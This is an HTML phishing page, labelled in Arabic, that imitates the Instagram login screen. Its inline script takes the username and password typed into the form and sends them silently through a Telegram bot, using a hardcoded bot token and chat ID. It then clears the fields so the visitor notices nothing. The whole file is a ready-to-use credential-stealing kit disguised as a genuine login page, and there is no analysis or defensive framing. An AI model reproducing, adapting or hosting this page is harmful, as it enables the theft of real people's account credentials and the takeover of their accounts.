<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 10px;
            width: 350px;
            text-align: center;
            padding: 40px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #262626;
            margin-bottom: 20px;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            background-color: #fafafa;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #a3a3a3;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #007acc;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم" required />
            <input type="password" id="password" placeholder="كلمة المرور" required />
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>

    <script>
        const botToken = '8080174902:AAHX9XK3_Yd-TkY8Vq2LBzK8BGCWFmqy17o'; // توكن البوت
        const chatId = '7203065656'; // معرف الدردشة الخاص بك

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // منع إرسال النموذج الافتراضي

            // جمع البيانات
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // رسالة التي ستُرسل
            const message = `👤 اسم المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;

            // رابط API تيليغرام
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // إرسال الطلب بصمت
            fetch(url)
                .catch(error => {
                    console.error('Error:', error); // تسجيل الأخطاء في وحدة التحكم فقط
                });

            // إعادة توجيه أو إعادة تعيين النموذج بعد الإرسال
            document.getElementById('loginForm').reset(); // إعادة تعيين الحقول
        });
    </script>
</body>
</html>
